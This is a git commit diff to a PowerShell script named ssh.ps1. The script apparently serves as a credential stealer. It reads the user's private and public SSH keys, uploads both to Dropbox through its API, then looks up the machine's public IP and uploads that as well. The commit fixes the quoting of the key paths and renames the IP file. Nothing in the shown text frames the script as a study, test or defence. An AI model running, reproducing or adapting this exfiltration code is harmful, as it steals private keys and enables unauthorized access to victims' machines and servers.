12b2490b6f51e922fbc10d0ddaa3e73bd89ece32
GhostFusion0 <75814036+GhostFusion0@users.noreply.github.com>
2025-05-05 19:37:52 -0500

    Update ssh.ps1

--- script/ssh.ps1
+++ script/ssh.ps1
@@ -29,11 +29,11 @@ $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
-$filename = $env:USERPROFILE\.ssh\id_rsa
-$pub = $env:USERPROFILE\.ssh\id_rsa.pub
+$filename = "$env:USERPROFILE\.ssh\id_rsa"
+$pub = "$env:USERPROFILE\.ssh\id_rsa.pub"
 
 DropBox-Upload -FileName $filename
 DropBox-Upload -FileName $pub
 $currentip = Invoke-RestMethod -uri (“https://api.ipify.org/”)
-$currentip | Out-File "C:\ip.txt"
-DropBox-Upload -FileName "C:\ip.txt"
+$currentip | Out-File "C:\ip-$currentip.txt"
+DropBox-Upload -FileName "C:\ip-$currentip.txt"
